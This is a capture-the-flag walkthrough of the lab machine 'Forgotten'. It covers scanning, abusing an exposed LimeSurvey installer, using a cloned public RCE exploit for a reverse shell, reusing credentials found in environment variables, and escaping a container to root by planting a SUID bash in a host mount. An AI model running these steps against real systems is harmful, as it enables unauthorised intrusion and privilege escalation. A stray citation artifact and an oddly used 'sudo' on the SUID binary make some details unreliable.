# Forgotten Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.234.81
```

Open ports:

- 22 (SSH)
- 80 (HTTP)

---

## 2. User Flag

### Web Enumeration

The website was accessible on port 80.

Directory brute forcing:

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.129.234.81
```

Discovered directory:

```
/survey
```

Visiting `/survey` revealed a LimeSurvey installer page.

---

### Installing LimeSurvey

The installer required a MySQL database.  
A temporary MySQL instance was deployed locally using Docker:

```bash
sudo docker pull mysql
sudo docker run -p 3306:3306 --rm --name tmp-mysql -e MYSQL_ROOT_PASSWORD=password mysql:latest
```

Verify that MySQL is listening:

```bash
netstat -tanp | grep LISTEN
ss -tlpn
```

During installation, the attacker's IP address was used as the database location.

After installation, login to the admin panel revealed the version:

```
LimeSurvey 6.3.7+231127
```

---

### Exploiting LimeSurvey

Searching for vulnerabilities related to this version led to:

:contentReference[oaicite:0]{index=0}

Exploit repository:

```bash
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
```

After modifying the reverse shell payload and following the README instructions, a reverse shell was obtained.

---

### SSH Access

Inside the container:

```bash
env
```

Credentials for user `limesvc` were discovered.

Login via SSH:

```bash
ssh limesvc@10.129.234.81
```

User flag obtained.

---

## 3. Root Flag

### Privilege Escalation in Container

Check sudo permissions:

```bash
sudo -l
```

Output showed:

```
(ALL : ALL) ALL
```

This means `limesvc` can run any command as root inside the container.

Switch to root:

```bash
sudo su
```

However, this only granted root access inside the container, not on the host system.

---

### Discovering Host Mount

Check mounted filesystems:

```bash
findmnt -o TARGET,SOURCE,FSTYPE,PROPAGATION
```

Discovered:

```
/var/www/html/survey  /dev/root[/opt/limesurvey]
```

This indicates that `/var/www/html/survey` inside the container is mounted from `/opt/limesurvey` on the host.

---

### Escaping the Container

Create a test file inside the mounted directory:

```bash
touch /var/www/html/survey/temp
```

On the host system:

```bash
ls -lah /opt/limesurvey
```

The file `temp` appeared and was owned by `root`.

This confirmed that files written inside the container were created as root on the host.

---

### Abusing SUID

Copy bash into the mounted directory:

```bash
sudo cp /bin/bash /var/www/html/survey/0xB1rd
```

Set SUID permission:

```bash
chmod 6777 /var/www/html/survey/0xB1rd
```

On the host:

```bash
sudo ./0xB1rd -p
```

Root shell obtained on the host system.

Root flag captured.

---

## What We Learned

### 1. Web Installers Can Be Abused

Exposed setup pages can allow attackers to control backend configuration, including database connections.

---

### 2. Containers Do Not Guarantee Isolation

Misconfigured mounts between container and host can lead to full host compromise.

---

### 3. SUID Abuse Is Extremely Dangerous

If a container writes files as root on the host, attackers can plant SUID binaries and escalate privileges.

---

### 4. Always Validate Mount Configurations

Improperly mounted volumes between container and host break isolation boundaries and enable container escape.